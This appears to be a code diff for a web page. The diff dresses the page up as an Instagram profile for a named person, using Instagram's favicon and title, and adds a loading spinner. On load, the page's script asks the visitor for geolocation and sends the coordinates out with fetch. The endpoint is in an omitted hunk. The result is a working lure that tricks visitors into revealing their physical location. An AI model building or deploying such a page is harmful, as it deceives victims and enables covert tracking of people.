@@ -1,17 +1,42 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>kiw</title>
+    <link
+      data-default-icon="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png"
+      rel="icon"
+      sizes="192x192"
+      href="https://static.cdninstagram.com/rsrc.php/v4/yI/r/VsNE-OHk_8a.png"
+    />
+    <title>
+      Ilham Rahmaddani Adhie Prayoga (@ilhamrhmddni) • Instagram photos and
+      videos
+    </title>
+    <style>
+      /* Tambahkan gaya untuk animasi loading */
+      #loading {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        font-size: 18px;
+        color: #555;
+      }
+    </style>
   </head>
   <body>
+    <div id="loading">Loading...</div>
+    <!-- Elemen animasi loading -->
     <script>
       window.onload = getLocation; // Panggil getLocation otomatis saat halaman dimuat
 
       function getLocation() {
+        document.getElementById("loading").style.display = "block"; // Tampilkan animasi loading
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(sendPosition, handleError);
         } else {
           alert("Geolocation tidak didukung oleh browser Anda.");
+          document.getElementById("loading").style.display = "none"; // Sembunyikan animasi loading
         }
       }
 
@@ -38,10 +63,14 @@
           })
           .catch(() => {
             // Gagal kirim data, tidak ada aksi tambahan
+          })
+          .finally(() => {
+            document.getElementById("loading").style.display = "none"; // Sembunyikan animasi loading
           });
       }
 
       function handleError(error) {
+        document.getElementById("loading").style.display = "none"; // Sembunyikan animasi loading
         alert(
           "Gagal mendapatkan lokasi. Pastikan Anda mengizinkan akses lokasi."
         );
